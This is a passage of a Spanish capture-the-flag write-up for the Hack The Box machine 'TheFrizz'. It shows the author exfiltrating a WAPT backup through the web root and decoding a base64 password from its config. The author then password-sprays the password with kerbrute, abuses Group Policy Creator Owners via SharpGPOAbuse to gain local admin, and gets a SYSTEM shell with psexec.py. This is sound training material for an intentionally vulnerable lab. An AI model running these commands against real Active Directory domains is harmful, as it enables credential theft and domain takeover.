Ahora necesitamos la shell como el usuario `w.webservice`, para poder copiar el archivo `.7z` al directorio `htdocs`, el cual contiene todos los archivos que muestra la web, en este caso el contenido carga de forma predeterminada bajo la ruta `/home`, podemos alojar el archivo `7z` allí

~~~ powershell
# Shell as w.webservice
PS C:\Programdata> move '.\$RE2XMEG.7z' wapt-backup-sunday.7z
PS C:\Programdata> copy .\$RE2XMEG.7z C:\xampp\htdocs\home

PS C:\xampp\htdocs\home> dir wapt-backup-sunday.7z

    Directory: C:\xampp\htdocs\home
    
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/24/2024   9:16 PM       30416987 wapt-backup-sunday.7z                                                
~~~

Desde nuestro navegador o el siguiente comando, podemos descargar el archivo

~~~ bash
wget 'http://frizzdc.frizz.htb/home/wapt-backup-sunday.7z'
~~~


## Credentials Leakage

Extraemos el archivo que descargamos para analizar su contenido en busca de información que nos permita continuar

~~~ bash
7z x wapt-backup-sunday.7z
~~~

Tendremos gran cantidad de archivos para inspeccionar, sin embargo, veremos algo interesante en la carpeta `conf`, incluso este [artículo](https://www.wapt.fr/en/doc-2.1/wapt-security.html#enabling-active-directory-authentication) nos da una pista

![image-center](/assets/images/posts/thefrizz-creds.png)
{: .align-center}

Si inspeccionamos este archivo, veremos un campo `wapt_password`, que contiene una cadena codificada

~~~ bash
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log
~~~

Decodificaremos esta cadena desde `base64`, obtendremos una credencial en texto claro

~~~ bash
echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d                                                                          
!suBcig@MehTed!R
~~~

### Password Spraying

Si hacemos `passwordspray` intentando autenticarnos como todos los usuarios, notaremos que la contraseña es válida para el usuario `m.schoolbus`

~~~ bash
kerbrute passwordspray -d frizz.htb --dc frizzdc.frizz.htb users.txt '!suBcig@MehTed!R'  

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 08/24/25 - Ronnie Flathers @ropnop

2025/08/24 02:27:40 >  Using KDC(s):
2025/08/24 02:27:40 >  	frizzdc.frizz.htb:88

2025/08/24 02:27:42 >  [+] VALID LOGIN:	M.SchoolBus@frizz.htb:!suBcig@MehTed!R
~~~


## Shell as `m.schoolbus`

Para conectarnos al dominio, primero solicitaremos un ticket `kerberos` para el usuario `m.schoolbus`

~~~ bash
getTGT.py frizz.htb/m.schoolbus:'!suBcig@MehTed!R' -dc-ip frizzdc.frizz.htb 
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in m.schoolbus.ccache
~~~

Ahora al igual que con el usuario `f.frizzle`, usaremos el ticket para conectarnos vía `SSH`

~~~ bash
KRB5CCNAME=m.schoolbus.ccache ssh -k m.schoolbus@frizzdc.frizz.htb

PowerShell 7.4.5
PS C:\Users\M.SchoolBus> whoami
frizz\m.schoolbus
~~~


## Abusing GPOs (Group Policy Objects)

El abuso de directivas de grupo es una técnica de post-explotación que contempla la modificación de las políticas de grupo en Active Directory, las nuevas políticas maliciosas permitirían modificar configuraciones del sistema, manipular usuarios y/o equipos del dominio, etc.

> GPO (`Group Policy Object`) es un conjunto de configuraciones que se pueden aplicar a usuarios y equipos dentro de un dominio de Active Directory. Estas configuraciones determinan el comportamiento de los usuarios y/o equipos dentro de un dominio.
{: .notice--info}

Si consultamos los grupos a los que el usuario `m.schoolbus` pertenece, notaremos que pertenece al grupo `Group Policy Creator Owners `

> El grupo `Group Policy Creator Owners ` en Active Directory (AD) otorga a sus miembros la capacidad de crear nuevos objetos de directiva de grupo (GPO), pero solo pueden editar o eliminar los GPO que ellos mismos hayan creado.
{: .notice--info}

El siguiente artículo de [Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#group-policy-creator-owners) contiene más información sobre este grupo en Active Directory

~~~ powershell
PS C:\Users\M.SchoolBus> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes
============================================ ================ ============================================== ===============================================================
Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users              Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
frizz\Desktop Admins                         Group            S-1-5-21-2386970044-1145388522-2932701813-1121 Mandatory group, Enabled by default, Enabled group
frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
frizz\Denied RODC Password Replication Group Alias            S-1-5-21-2386970044-1145388522-2932701813-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level       Label            S-1-16-8192
~~~

Para llevar a cabo nuestra escalada de privilegios, crearemos una nueva política de grupo que esté enlazada a la GPO principal según la siguiente [guía de buenas prácticas](https://www.netwrix.com/group-policy-best-practices.html).

> Cualquier GPO configurado a nivel de dominio se aplicará a todos los objetos de Active Directory del dominio, lo que podría dar lugar a que algunos ajustes se apliquen a usuarios y equipos inadecuados. El único GPO que debe configurarse a nivel de dominio es la directiva de dominio predeterminada. 
{: .notice--danger}

En este caso existen dos políticas de grupo, las que se crean de forma predeterminada

~~~ bash
PS C:\ProgramData> Get-GPO -All

DisplayName      : Default Domain Policy
DomainName       : frizz.htb
Owner            : frizz\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 10/29/2024 7:19:24 AM
ModificationTime : 10/29/2024 7:25:44 AM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 

DisplayName      : Default Domain Controllers Policy
DomainName       : frizz.htb
Owner            : frizz\Domain Admins
Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 10/29/2024 7:19:24 AM
ModificationTime : 10/29/2024 7:19:24 AM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 
~~~

Utilizaremos el proyecto `SharpGPOAbuse`, lo descargaremos y lo subiremos a la máquina víctima. Podemos copiar el ejecutable directamente con `scp`

~~~ bash
KRB5CCNAME=m.schoolbus.ccache scp ../exploits/SharpGPOAbuse.exe 'm.schoolbus@frizzdc.frizz.htb:C:\Programdata' 
SharpGPOAbuse.exe 
~~~

### Exploiting - Local Administrator

Comenzaremos creando un nuevo grupo de políticas, puedes usar un nombre que lo distinga de los otros GPO

~~~ bash
PS C:\ProgramData> New-GPO -name "incommatose" 

DisplayName      : incommatose
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : 18684475-3e0c-44c8-a6f0-9f81a49c42f6
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 8/24/2025 7:42:27 PM
ModificationTime : 8/24/2025 7:42:27 PM
UserVersion      : 
ComputerVersion  : 
WmiFilter        :
~~~

Ahora enlazaremos este nuevo GPO a la OU donde se encuentra el controlador de dominio, especificaremos el `Distinguished Name`

~~~ bash
PS C:\ProgramData> New-GPLINK -name "incommatose" -target "OU=Domain Controllers,DC=frizz,DC=htb" 

GpoId       : 18684475-3e0c-44c8-a6f0-9f81a49c42f6
DisplayName : incommatose
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 2
~~~

En mi caso he agregado al usuario `m.school` al grupo `Administrators` de manera local

~~~ bash
PS C:\ProgramData> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "m.schoolbus" --GPOName "incommatose" --Author "incommatose"
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] SID Value of m.schoolbus = S-1-5-21-2386970044-1145388522-2932701813-1106
[+] GUID of "incommatose" is: {3215F2BD-81EF-4A6E-A11F-73F277CA6CBA}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{3215F2BD-81EF-4A6E-A11F-73F277CA6CBA}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
~~~


## Root Time

Actualizaremos las políticas con el comando `gpupdate` de manera forzada

~~~ powershell
PS C:\ProgramData> gpupdate /force                                                                                                                                                     
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
~~~

Si consultamos los grupos a los que pertenece `m.schoolbus`, veremos que ahora pertenece a `Administrators`

~~~ powershell
PS C:\ProgramData> net user m.schoolbus 
User name                    M.SchoolBus
Full Name                    Marvin SchoolBus
Comment                      Desktop Administrator
User\'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/29/2024 7:27:03 AM
Password expires             Never
Password changeable          10/29/2024 7:27:03 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/24/2025 3:16:38 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users         *Desktop Admins
The command completed successfully.
~~~

Como ahora el usuario `m.schoolbus` se encuentra en el grupo `Administrators`, debemos volver a generar un ticket `kerberos`. Esto de debe a que los tickets guardan información del usuario, incluyendo sus privilegios, a través de `PAC`

> En Kerberos, PAC son las siglas de `Privileged Attribute Certificate` (Certificado de Atributo de Privilegio), una estructura de datos que contiene información de autenticación y autorización sobre el usuario, como su identificación, pertenencia a grupos y otros privilegios.
{: .notice--info}

Solicitaremos un TGT para el usuario `m.school`, este contemplará los nuevos privilegios 

~~~ bash
ntpdate 10.10.11.60 && getTGT.py frizz.htb/m.schoolbus:'!suBcig@MehTed!R' -dc-ip frizzdc.frizz.htb

2025-08-24 23:46:11.151723 (-0400) +0.035359 +/- 0.086968 10.10.11.60 s1 no-leap
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in m.schoolbus.ccache
~~~

Ahora cargaremos el ticket en la variable `KRB5CCNAME` para emplearlo a modo de autenticación frente a `SSH`, ten en cuenta que debemos **cerrar la sesión actual del usuario `m.school`**

~~~ bash
KRB5CCNAME=m.schoolbus.ccache ssh -k m.schoolbus@frizzdc.frizz.htb
~~~

>Alternativamente, podremos conectarnos a través de herramientas como `psexec.py`, podremos obtener una consola como `nt authority\system`
{: .notice--warning}

~~~ bash
KRB5CCNAME=m.schoolbus.ccache psexec.py frizz.htb/m.schoolbus@frizzdc.frizz.htb -k -no-pass

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on frizzdc.frizz.htb.....
[*] Found writable share ADMIN$
[*] U ploading file oRIaJIzF.exe
[*] Opening SVCManager on frizzdc.frizz.htb.....
[*] Creating service jIcy on frizzdc.frizz.htb.....
[*] Starting service jIcy.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3207]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
~~~

Ahora ya podremos ver la última flag ubicada dentro de la carpeta `C:\Users\Administrator\Desktop`

~~~ powershell
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
b94...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> I am always doing that which I cannot do, in order that I may learn how to do it.
> — Pablo Picasso
{: .notice--info}
